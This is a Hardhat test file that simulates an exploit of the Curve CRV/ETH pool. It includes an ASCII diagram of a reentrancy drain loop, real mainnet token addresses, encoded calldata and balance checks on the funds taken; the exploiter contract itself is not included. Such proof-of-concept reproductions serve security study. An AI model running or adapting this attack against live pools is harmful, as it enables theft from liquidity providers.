import {
  time,
  loadFixture,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import abi from './abi/ERC20.json';

/* Curve CRV/ETH pool exploit variation

                        the main drying loop

                              action 1
      exploiter contract --- add 1 ETH ----→ CRV/ETH pool ←----------------
          |      ↑                              |    ↑                    |
          |      |             action 2         |    |                    |
          |      |_________remove position______|    |                    |
          |                      |                   |                    |
          |                      ↓                   |    action 2.5      |
          |                exploiter.fallback() ------exchange 1000 ETH   |
          |                                                               |
          |                                                               |
          |                           action 3                            |
          |_______________________exchange all CRVs_______________________|

*/

describe("exploit", function () {

  async function deploy() {

    const contract = await ethers.getContractFactory("Exploiter");
    const exploiter = await contract.deploy();
    await exploiter.waitForDeployment();

    return { exploiter };
  }

  describe("simulation", function () {
    it("Should eploit the CRV/ETH pool", async function () {
      const { exploiter } = await loadFixture(deploy);
      const _weth = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
      const _crv = '0xd533a949740bb3306d119cc777fa900ba034cd52';
      const iface = new ethers.Interface(abi);
      const weth = new ethers.Contract(_weth, iface);
      const crv = new ethers.Contract(_crv, iface);
      const amount = ethers.parseEther('10000');
      const data = '0x0000000000000000000000008301ae4fc9c624d1d396cbdaa1ed877821d7c511000000000000000000000000ed4064f376cb8d68f770fb1ff088a3d0f3ff5c4d000000000000000000000000d533a949740bb3306d119cc777fa900ba034cd52';

      const [owner] = await ethers.getSigners();
      await exploiter.execute([ _weth ], [ amount ], data, {gasLimit: '29000000'});
      console.log('After exploit');
      ///@ts-ignore
      console.log('exploiter CRV balance: ', BigInt(await crv.connect(owner).balanceOf(exploiter.target)) / BigInt(1e18));
      ///@ts-ignore
      console.log('exploiter ETH balance: ', BigInt(await weth.connect(owner).balanceOf(exploiter.target)) / BigInt(1e18));
    });
  });
});
